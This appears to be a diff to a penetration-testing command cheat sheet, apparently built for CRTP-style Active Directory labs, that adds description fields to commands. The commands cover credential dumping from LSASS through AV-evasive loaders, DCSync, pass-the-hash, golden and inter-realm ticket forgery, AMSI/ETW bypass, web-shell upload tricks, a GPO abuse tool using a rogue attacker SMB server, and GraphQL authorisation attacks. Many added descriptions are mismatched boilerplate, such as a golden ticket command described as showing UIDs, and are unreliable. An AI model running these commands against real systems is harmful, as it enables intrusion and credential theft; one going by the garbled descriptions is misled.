+          "description": "Searches the filesystem for files matching specific criteria. Used in enumeration to find SUID binaries, writable files, configuration files, and other privilege escalation opportunities."
         }
       ],
       "opsec": "moderate",
@@ -41744,43 +42000,53 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump logon passwords (evasive)",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-logonpasswords\" \"exit\"",
+          "description": "Runs Mimikatz logonpasswords through an evasive loader to dump plaintext credentials and NTLM hashes from LSASS. The loader helps bypass antivirus by avoiding dropping Mimikatz directly to disk."
         },
         {
           "label": "Dump encryption keys (ekeys)",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-ekeys\" \"exit\""
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-ekeys\" \"exit\"",
+          "description": "Extracts Kerberos encryption keys (AES256, AES128, RC4/NTLM) from LSASS via an evasive loader. These keys are used for forging Kerberos tickets (Golden/Silver/Diamond tickets)."
         },
         {
           "label": "Pass-the-hash into a new process",
-          "command": "Loader.exe -Path <safetykatz_exe> -args \"sekurlsa::evasive-pth /domain:<dc> /user:Administrator /ntlm:<ntlm>\" \"exit\""
+          "command": "Loader.exe -Path <safetykatz_exe> -args \"sekurlsa::evasive-pth /domain:<dc> /user:Administrator /ntlm:<ntlm>\" \"exit\"",
+          "description": "Performs Pass-the-Hash through an evasive loader - spawns a new process authenticated with a stolen NTLM hash. Avoids AV detection that triggers on standard Mimikatz execution."
         },
         {
           "label": "DCSync a user (get krbtgt hash)",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\""
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\"",
+          "description": "Performs DCSync through an evasive loader to extract password hashes from the domain controller by simulating replication. The loader wraps Mimikatz to evade endpoint detection."
         },
         {
           "label": "Dump LSA secrets / local SAM",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-lsa /patch\" \"exit\"    # or lsadump::evasive-sam"
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-lsa /patch\" \"exit\"    # or lsadump::evasive-sam",
+          "description": "Patches LSASS to dump credentials via an evasive loader. Modifies LSASS in memory to extract stored secrets while avoiding detection of standard Mimikatz on disk."
         },
         {
           "label": "Dump inter-realm trust keys",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-trust /patch\" \"exit\""
+          "command": "Loader.exe -path <safetykatz_exe> -args \"lsadump::evasive-trust /patch\" \"exit\"",
+          "description": "Extracts inter-domain trust keys via an evasive loader. These keys forge inter-realm TGTs for lateral movement across trusted domains and forests."
         },
         {
           "label": "Elevate token + read DPAPI vault creds",
-          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'"
+          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'",
+          "description": "Elevate token + read DPAPI vault creds. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Rubeus evasive golden / silver ticket",
-          "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt"
+          "command": "Loader.exe -path <rubeus_exe> -args evasive-golden /aes256:<aes> /user:Administrator /id:500 /domain:<domain> /sid:<sid> /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Lab evasive Mimikatz wrapper (C:\\AD\\Tools)",
-          "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in"
+          "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in",
+          "description": "Bypasses the Antimalware Scan Interface (AMSI) in the current PowerShell session. AMSI inspects PowerShell scripts before execution - patching it allows running tools that would otherwise be blocked by AV."
         },
         {
           "label": "Lab evasive cred wrapper — modify then run",
-          "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI"
+          "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI",
+          "description": "Lab evasive cred wrapper — modify then run. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "Verb map (evasive- prefix on the CRTP custom build):\n- sekurlsa::evasive-logonpasswords / evasive-keys / evasive-ekeys - creds & Kerberos keys from LSASS (T1003.001)\n- sekurlsa::evasive-pth - pass-the-hash into a new logon session\n- lsadump::evasive-dcsync /user:<domain>\\krbtgt - pull krbtgt/any hash via replication (feeds golden ticket)\n- lsadump::evasive-lsa /patch  |  lsadump::evasive-sam - LSA secrets / local SAM\n- lsadump::evasive-trust /patch - inter-realm trust keys (feeds cross-domain/forest tickets)\n- token::evasive-elevate + vault::cred /patch - elevate then dump Credential Manager/DPAPI vault (scheduled-task creds etc.)\n- misc::memssp - register a malicious SSP so future logons are logged in plaintext to C:\\Windows\\System32\\mimilsa.log (credential-capture persistence)\n- misc::skeleton - skeleton key (see crtp-skeleton-key)\n- crypto::certificates /export - export machine/user certificates (cert theft / PKINIT)\n- Rubeus evasive-golden / evasive-silver - forge tickets in-memory\nAlways run through crtp-loader (ETW/AMSI unhook). If a verb still gets flagged, obfuscate the binary (crtp-tool-obfuscation) and re-check with DefenderCheck.",
@@ -42188,11 +42454,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Password auth",
-          "command": "evil-winrm -i <ip> -u <user> -p '<password>'"
+          "command": "evil-winrm -i <ip> -u <user> -p '<password>'",
+          "description": "Opens a PowerShell session on a remote Windows host via WinRM (port 5985/5986). Feature-rich shell with file upload/download, DLL loading, and memory execution capabilities."
         },
         {
           "label": "SSL + load scripts/binaries",
-          "command": "evil-winrm -i <ip> -u <user> -H <nt_hash> -S -s /scripts/ -e /binaries/"
+          "command": "evil-winrm -i <ip> -u <user> -H <nt_hash> -S -s /scripts/ -e /binaries/",
+          "description": "Connects to a Windows host via WinRM using an NTLM hash (pass-the-hash). Provides a PowerShell session without needing the plaintext password."
         }
       ],
       "explain": "Pass-the-hash into an interactive WinRM shell:\n  evil-winrm -i <ip>       the target (WinRM 5985/5986)\n  -u <user>                the account\n  -H <nt_hash>             authenticate with its NT hash instead of a password\nThe account must be in Remote Management Users. Add -S for HTTPS and -s/-e for local script/binary directories."
@@ -42416,11 +42684,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pass-the-hash",
-          "command": "evil-winrm -i <target> -u <user> -H <nt_hash>"
+          "command": "evil-winrm -i <target> -u <user> -H <nt_hash>",
+          "description": "Connects to a Windows host via WinRM using an NTLM hash (pass-the-hash). Provides a PowerShell session without needing the plaintext password."
         },
         {
           "label": "With scripts/executables dir",
-          "command": "evil-winrm -i <target> -u <user> -p <password> -s /opt/scripts -e /opt/bins"
+          "command": "evil-winrm -i <target> -u <user> -p <password> -s /opt/scripts -e /opt/bins",
+          "description": "Opens a PowerShell session on a remote Windows host via WinRM (port 5985/5986). Feature-rich shell with file upload/download, DLL loading, and memory execution capabilities."
         }
       ],
       "explain": "Opens an interactive PowerShell shell over WinRM with credentials:\n  evil-winrm -i <target>   the target host (WinRM 5985/HTTP, 5986/HTTPS)\n  -u <user> -p <password>  domain or local credentials\nThe account must be in Remote Management Users/Administrators. -H <nt_hash> authenticates by hash (pass-the-hash); -s and -e set local script/binary directories for in-memory loading."
@@ -42654,11 +42924,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Screenshot a URL list",
-          "command": "eyewitness --web -f urls.txt -d <output_dir>"
+          "command": "eyewitness --web -f urls.txt -d <output_dir>",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         },
         {
           "label": "All protocols (RDP/VNC/web)",
-          "command": "eyewitness --all-protocols -x web_discovery.xml -d <output_dir>"
+          "command": "eyewitness --all-protocols -x web_discovery.xml -d <output_dir>",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         }
       ],
       "explain": "Screenshots every web app from an Nmap XML with EyeWitness:\n  eyewitness --web   web-app mode\n  -x web_discovery.xml   parse targets from the nmap XML\n  -d <output_dir>        report output directory\nBuilds a browsable report so you can visually triage many hosts and spot login/admin/default pages fast; -f urls.txt takes a plain URL list, --all-protocols adds RDP/VNC."
@@ -42953,7 +43225,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Recursive + Extensions",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ -recursion -recursion-depth 1 -e .php -v"
+          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ -recursion -recursion-depth 1 -e .php -v",
+          "description": "Fuzzes web directories or URL parameters using ffuf. Discovers hidden content, API endpoints, and parameters by brute-forcing URL paths."
         }
       ],
       "opsec": "moderate",
@@ -43400,7 +43673,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Extension Fuzz",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<ip>:<port>/<dir>/indexFUZZ"
+          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://<ip>:<port>/<dir>/indexFUZZ",
+          "description": "Fuzzes web directories or URL parameters using ffuf. Discovers hidden content, API endpoints, and parameters by brute-forcing URL paths."
         }
       ],
       "opsec": "moderate",
@@ -43596,7 +43870,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "POST",
-          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<host>:<port>/<page> -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>"
+          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<host>:<port>/<page> -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>",
+          "description": "Fuzzes web directories or URL parameters using ffuf. Discovers hidden content, API endpoints, and parameters by brute-forcing URL paths."
         }
       ],
       "opsec": "moderate",
@@ -44528,15 +44803,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "ASP / ASPX",
-          "command": ".asp .aspx .config .cer .asa .cdx .ashx .asmx .aspq .axd"
+          "command": ".asp .aspx .config .cer .asa .cdx .ashx .asmx .aspq .axd",
+          "description": "Alternative web shell file extension for the target server technology. Each server-side language has specific extensions that the web server processes for code execution."
         },
         {
           "label": "JSP / other",
-          "command": ".jsp .jspx .jsw .jsv .jspf .war   |   .pl .cgi .py .sh"
+          "command": ".jsp .jspx .jsw .jsv .jspf .war   |   .pl .cgi .py .sh",
+          "description": "Alternative web shell file extension for the target server technology. Each server-side language has specific extensions that the web server processes for code execution."
         },
         {
           "label": "Trick variants",
-          "command": "shell.php.jpg   shell.php%00.jpg   shell.pHp   shell.php.   shell.php;.jpg   shell.php:.jpg"
+          "command": "shell.php.jpg   shell.php%00.jpg   shell.pHp   shell.php.   shell.php;.jpg   shell.php:.jpg",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         }
       ],
       "opsec": "moderate",
@@ -45814,15 +46092,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Request an inter-realm TGS",
-          "command": "Rubeus.exe asktgs /service:cifs/<target_dc>.<target_forest> /dc:<target_dc> /ptt /ticket:<inter_realm_tgt>"
+          "command": "Rubeus.exe asktgs /service:cifs/<target_dc>.<target_forest> /dc:<target_dc> /ptt /ticket:<inter_realm_tgt>",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "DCSync the inter-forest trust account",
-          "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\<trust_account>$\" \"exit\""
+          "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\<trust_account>$\" \"exit\"",
+          "description": "Performs DCSync by simulating a domain controller replication request (DRSUAPI). Extracts password hashes for any account from the DC without running code on it - requires DA or replication privileges."
         },
         {
           "label": "evasive-silver inter-realm TGT (Rubeus)",
-          "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt"
+          "command": "Rubeus.exe silver /service:krbtgt/<target_forest> /rc4:<trust_key> /sids:<target_EA_sid> /user:Administrator /domain:<domain> /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         }
       ],
       "explain": "Forges an inter-realm referral TGT using the shared forest trust key to reach a trusted external forest:\n  golden /rc4:<nt_hash>     here <nt_hash> is the trust key from lsadump::trust /patch\n  /domain:<domain> /sid:<domain_sid>   your (source) domain and SID\n  /sids:<target_enterprise_admin_sid>  target forest privileged SID\n  /service:krbtgt /target:<target_domain>   forge a referral ticket toward the target realm\n  /ptt                      inject it\nThen Rubeus asktgs for a service (e.g. cifs/<dc>) in the target forest. Note: SID filtering across a forest trust usually blocks EA SIDs, so this typically yields only trust-permitted access."
@@ -46010,7 +46291,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Just alive hosts",
-          "command": "fping -asgq <cidr> 2>/dev/null"
+          "command": "fping -asgq <cidr> 2>/dev/null",
+          "description": "Sends ICMP pings to a range of hosts and reports which are alive. Faster than nmap -sn for quick host discovery on a subnet."
         }
       ],
       "steps": [
@@ -46461,7 +46743,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Hydra",
-          "command": "hydra -L users.list -P passwords.list ftp://<ip>"
+          "command": "hydra -L users.list -P passwords.list ftp://<ip>",
+          "description": "Brute-forces FTP credentials using Hydra. Tests login combinations against the FTP service."
         }
       ],
       "opsec": "loud",
@@ -46673,15 +46956,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Mirror everything via wget",
-          "command": "wget -m --no-passive ftp://anonymous:anonymous@<ip>"
+          "command": "wget -m --no-passive ftp://anonymous:anonymous@<ip>",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Nmap FTP scan",
-          "command": "sudo nmap -sV -p21 -sC -A <ip>"
+          "command": "sudo nmap -sV -p21 -sC -A <ip>",
+          "description": "Runs an nmap scan with version detection, default scripts, aggressive mode (OS detection, versions, scripts, traceroute) for detailed service enumeration and target analysis."
         },
         {
           "label": "Nmap with script trace",
-          "command": "sudo nmap -sV -p21 -sC -A <ip> --script-trace"
+          "command": "sudo nmap -sV -p21 -sC -A <ip> --script-trace",
+          "description": "Runs an nmap scan with version detection, default scripts, aggressive mode (OS detection, versions, scripts, traceroute) for detailed service enumeration and target analysis."
         }
       ],
       "opsec": "moderate",
@@ -47768,7 +48054,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Automated enumeration with gcp_enum script",
-          "command": "./gcp_enum.sh"
+          "command": "./gcp_enum.sh",
+          "description": "Automated enumeration with gcp_enum script. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "GCP privesc is about specific dangerous permissions rather than a single 'admin' flag. High-value primitives: iam.serviceAccounts.getAccessToken / iam.serviceAccounts.actAs / iam.serviceAccounts.implicitDelegation (impersonate a more-privileged SA), iam.serviceAccountKeys.create (mint a key for a better SA), iam.roles.update (add permissions to a role you can edit), *.setIamPolicy (bind yourself a better role), deploymentmanager.deployments.create + cloudfunctions/compute (run as a privileged SA), cloudbuild. RhinoSecurityLabs GCP-IAM-Privilege-Escalation automates enumeration (enumerate_member_permissions.py) and detection/exploitation (check_for_privesc.py + exploit_scripts/*). Manual path: gcloud iam service-accounts get-iam-policy to find SAs you can actAs, then --impersonate-service-account or keys create.",
@@ -48592,11 +48879,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Authenticated (enumerate + roast)",
-          "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt"
+          "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt",
+          "description": "Uses Impacket GetNPUsers to perform AS-REP Roasting - requests authentication data for accounts with Kerberos pre-auth disabled. The returned AS-REP can be cracked offline to recover passwords."
         },
         {
           "label": "Single user, no creds",
-          "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat"
+          "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat",
+          "description": "Uses Impacket GetNPUsers to perform AS-REP Roasting - requests authentication data for accounts with Kerberos pre-auth disabled. The returned AS-REP can be cracked offline to recover passwords."
         }
       ],
       "steps": [
@@ -48812,7 +49101,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "From an AS-REP key",
-          "command": "python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>"
+          "command": "python /opt/PKINITtools/getnthash.py -key <as_rep_key> <domain>/<user>",
+          "description": "Extracts the NT hash from a PKINIT certificate-based authentication. Converts ADCS certificate exploitation results into a usable NTLM hash for pass-the-hash attacks."
         }
       ],
       "explain": "Recovers an NT hash from a PKINIT TGT's session key (step 2 after gettgtpkinit.py):\n  getnthash.py             derive the account's NT hash from Kerberos material\n  -key <as_rep_key>        the AS-REP encryption key printed by gettgtpkinit.py\n  <domain>/<dc_host>$      the account the TGT belongs to (here the DC machine account)\nThe recovered NT hash enables pass-the-hash DCSync without needing the ccache directly."
@@ -48988,7 +49278,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "From a PEM instead of base64",
-          "command": "python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> user.ccache"
+          "command": "python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> user.ccache",
+          "description": "Uses Impacket getTGT to request a Kerberos Ticket Granting Ticket (TGT) from the domain controller. Authenticates with a password, hash, or AES key and saves the TGT to a ccache file for use with other tools."
         }
       ],
       "steps": [
@@ -49175,11 +49466,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pass-the-ticket auth",
-          "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>"
+          "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>",
+          "description": "Uses Impacket GetUserSPNs to perform Kerberoasting - requests service tickets for accounts with SPNs and outputs the TGS hashes for offline cracking."
         },
         {
           "label": "Rubeus cross-domain",
-          "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap"
+          "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         }
       ],
       "steps": [
@@ -49657,7 +49950,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "DNS subdomain brute force",
-          "command": "gobuster dns -d <domain>.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt"
+          "command": "gobuster dns -d <domain>.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt",
+          "description": "Brute-forces DNS subdomains using gobuster. Discovers subdomains not visible in public records for expanding the attack surface."
         }
       ],
       "opsec": "moderate",
@@ -50001,15 +50295,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AES256 (stealthier)",
-          "command": "Rubeus.exe golden /aes256:<krbtgt_aes> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt"
+          "command": "Rubeus.exe golden /aes256:<krbtgt_aes> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Mimikatz",
-          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash> /ptt"
+          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash> /ptt",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Save to file for later",
-          "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi"
+          "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /outfile:golden.kirbi",
+          "description": "Uses Rubeus to compute Kerberos encryption keys (RC4/AES128/AES256) from a plaintext password. These keys are needed for forging tickets (golden/silver/diamond tickets)."
         }
       ],
       "explain": "Forges a Golden Ticket - a TGT signed with the domain's krbtgt key - for persistent, arbitrary-user domain access:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>           the krbtgt NTLM hash (use /aes256 to be stealthier)\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /user:Administrator      the identity to impersonate\n  /ptt                      inject the ticket into this session\nSince it is signed with krbtgt, the KDC honors it for any service; access the DC (dir \\\\<dc>\\C$). /ldap /printcmd auto-fills real PAC values for opsec."
@@ -50231,7 +50528,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Abuse via GPOddity (Linux/WSL, lab method)",
-          "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none"
+          "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Finds GPOs you can modify, so you can push code to every computer in the linked OU:\n  Get-DomainGPO             list all GPOs\n  | Get-DomainObjectAcl -ResolveGUIDs   read each GPO's ACL with readable right names\n  | ? {$_.ActiveDirectoryRights -match 'CreateChild|WriteProperty|GenericAll'}   keep only GPOs you can edit\nOn a writable GPO, SharpGPOAbuse --AddComputerTask adds a SYSTEM scheduled task (e.g. add yourself to local admins); gpupdate /force applies it."
@@ -50631,7 +50929,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Find the cpassword first (Groups.xml)",
-          "command": "findstr /S /I cpassword \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml"
+          "command": "findstr /S /I cpassword \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml",
+          "description": "Find the cpassword first (Groups.xml). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -50833,7 +51132,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Self-register as admin (mass assignment)",
-          "command": "mutation { registerUser(input: {username:\"x\", password:\"x\", role:\"admin\"}) { id } }"
+          "command": "mutation { registerUser(input: {username:\"x\", password:\"x\", role:\"admin\"}) { id } }",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Enumerate mutations via introspection, then abuse a mass-assignment flaw - set a privileged field like role:\"admin\" that the client UI never exposes - to register an admin account or escalate.\nMutations are GraphQL's write operations - introspect mutationType to list them and inspect each input type for privileged fields (role, isAdmin, verified) the front-end never sends."
@@ -51382,7 +51682,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Iterate object ids",
-          "command": "{ user(id: <n>) { username email } }"
+          "command": "{ user(id: <n>) { username email } }",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Access other users' records by supplying their identifier as a query argument when the resolver performs no ownership check - combine with over-fetching to pull their password/role.:\n  { user(username: \"<victim>\") { username password role } }\nThe bug is a missing authorisation check in the resolver: user(username:) returns any user's object regardless of who's asking."
@@ -51569,7 +51870,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump users with all fields",
-          "command": "{ users { id username password email role } }"
+          "command": "{ users { id username password email role } }",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Extract sensitive data by requesting fields the UI never asks for - GraphQL returns exactly the fields you name, so adding password/role/secret to a query over-fetches restricted data.:\n  { users { id username password role } }\nGraphQL's core power - client picks the fields - is the flaw: if the resolver doesn't enforce field-level authorisation, naming password or role returns them even though the app UI never displays them."
@@ -51765,11 +52067,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Full introspection query",
-          "command": "{ __schema { queryType { name } types { name fields { name } } } }"
+          "command": "{ __schema { queryType { name } types { name fields { name } } } }",
+          "description": "Full introspection query. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Via a tool (clairvoyance if disabled)",
-          "command": "python3 clairvoyance.py http://<target>/graphql -o schema.json"
+          "command": "python3 clairvoyance.py http://<target>/graphql -o schema.json",
+          "description": "Via a tool (clairvoyance if disabled). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -52490,15 +52794,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Attack modes (-a)",
-          "command": "-a 0  - Straight (dictionary)\n-a 1  - Combination (two wordlists)\n-a 3  - Brute-force / mask\n-a 6  - Hybrid wordlist + mask\n-a 7  - Hybrid mask + wordlist"
+          "command": "-a 0  - Straight (dictionary)\n-a 1  - Combination (two wordlists)\n-a 3  - Brute-force / mask\n-a 6  - Hybrid wordlist + mask\n-a 7  - Hybrid mask + wordlist",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Built-in charsets",
-          "command": "?l  - abcdefghijklmnopqrstuvwxyz\n?u  - ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d  - 0123456789\n?h  - 0123456789abcdef\n?H  - 0123456789ABCDEF\n?s  - (space)!\"#$%&'()*+,-./:;<=>?@[]^_`{|}~\n?a  - ?l?u?d?s\n?b  - 0x00 - 0xff"
+          "command": "?l  - abcdefghijklmnopqrstuvwxyz\n?u  - ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d  - 0123456789\n?h  - 0123456789abcdef\n?H  - 0123456789ABCDEF\n?s  - (space)!\"#$%&'()*+,-./:;<=>?@[]^_`{|}~\n?a  - ?l?u?d?s\n?b  - 0x00 - 0xff",
+          "description": "Reference table of hashcat built-in character sets for mask attacks. Each placeholder (?l, ?u, ?d, ?s, ?a) represents a character class used to define password patterns."
         },
         {
           "label": "Custom charsets",
-          "command": "-1 ?l?u        # define set 1 = letters\n-2 ?d?s        # define set 2 = digits+symbols\n# then reference in the mask:\nhashcat -a 3 -m 0 <hash> -1 ?l?u -2 ?d?s '?1?1?1?1?2?2'"
+          "command": "-1 ?l?u        # define set 1 = letters\n-2 ?d?s        # define set 2 = digits+symbols\n# then reference in the mask:\nhashcat -a 3 -m 0 <hash> -1 ?l?u -2 ?d?s '?1?1?1?1?2?2'",
+          "description": "Cracks password hashes with hashcat (mode 0) using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "opsec": "silent",
@@ -52564,19 +52871,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows / AD",
-          "command": "1000  NTLM (NT hash)\n3000  LM\n5500  NetNTLMv1\n5600  NetNTLMv2 (Responder)\n13100 Kerberoast (TGS-REP, etype 23)\n18200 AS-REP Roast (etype 23)\n12800 MS-Cache / DCC1\n2100  DCC2 (mscash2)"
+          "command": "1000  NTLM (NT hash)\n3000  LM\n5500  NetNTLMv1\n5600  NetNTLMv2 (Responder)\n13100 Kerberoast (TGS-REP, etype 23)\n18200 AS-REP Roast (etype 23)\n12800 MS-Cache / DCC1\n2100  DCC2 (mscash2)",
+          "description": "Reference table of hashcat mode numbers for Windows and Active Directory hash types. Covers NTLM, NetNTLMv1/v2, DCC, and Kerberos ticket formats."
         },
         {
           "label": "Unix / linux",
-          "command": "1800  sha512crypt ($6$)  /etc/shadow\n500   md5crypt ($1$)\n7400  sha256crypt ($5$)\n3200  bcrypt ($2*$)\n1500  descrypt\n122   macOS 10.4-10.6"
+          "command": "1800  sha512crypt ($6$)  /etc/shadow\n500   md5crypt ($1$)\n7400  sha256crypt ($5$)\n3200  bcrypt ($2*$)\n1500  descrypt\n122   macOS 10.4-10.6",
+          "description": "Reference table of hashcat mode numbers for Unix/Linux password hash formats. Covers sha512crypt, md5crypt, sha256crypt, bcrypt, and other crypt() variants found in /etc/shadow."
         },
         {
           "label": "Web / app",
-          "command": "0    MD5\n100  SHA1\n1400 SHA-256\n1700 SHA-512\n3200 bcrypt\n10000 Django PBKDF2-SHA256\n160  HMAC-SHA1"
